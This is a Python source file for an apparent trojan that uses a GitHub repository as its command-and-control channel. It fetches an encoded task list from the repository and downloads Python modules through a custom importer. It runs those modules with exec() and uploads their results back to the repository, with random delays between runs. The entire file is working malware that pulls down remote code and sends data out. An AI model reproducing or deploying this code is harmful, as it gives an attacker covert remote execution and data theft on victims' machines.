#!/usr/bin/python3
import base64
import github3
import importlib
import importlib.util
import json
import os
import random
import sys
import threading
import time
from datetime import datetime

# Connect to GitHub
def github_connect():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        raise ValueError("GitHub token not found in environment variables")
    user = 'ALLann123'
    sess = github3.login(token=token)
    return sess.repository(user, 'otntrojan')

# Fetch file contents from GitHub
def get_file_contents(dirname, module_name, repo):
    file_content = repo.file_contents(f'{dirname}/{module_name}')
    return file_content.content  # Use .content instead of .get_file_contents

# Trojan class to handle execution
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    # Get configuration from GitHub
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json).decode())  # Decode properly

        for task in config:
            if task['module'] not in sys.modules:
                importlib.import_module(task['module'])  # Secure import
        return config

    # Run a module
    def module_runner(self, module):
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[-] Error running module {module}: {e}")

    # Store output results in GitHub
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(str(data).encode()).decode()  # Ensure encoding is correct
        self.repo.create_file(remote_path, message, bindata)

    # Main loop to execute modules
    def run(self):
        while True:
            config = self.get_config()
            threads = []
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                threads.append(thread)
                thread.start()
                time.sleep(random.randint(1, 10))

            for thread in threads:
                thread.join()

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))

# GitImporter to load modules dynamically
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    # Find module in the GitHub repo
    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()

        try:
            new_library = get_file_contents('modules', f'{name}.py', self.repo)
            if new_library:
                self.current_module_code = base64.b64decode(new_library).decode()
                return self
        except Exception as e:
            print(f"[-] Failed to retrieve {name}: {e}")
        return None  # Return None if module is not found

    # Load module dynamically
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)  # Load code into module
        sys.modules[spec.name] = new_module  # Store in sys.modules
        return new_module

# Main execution
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
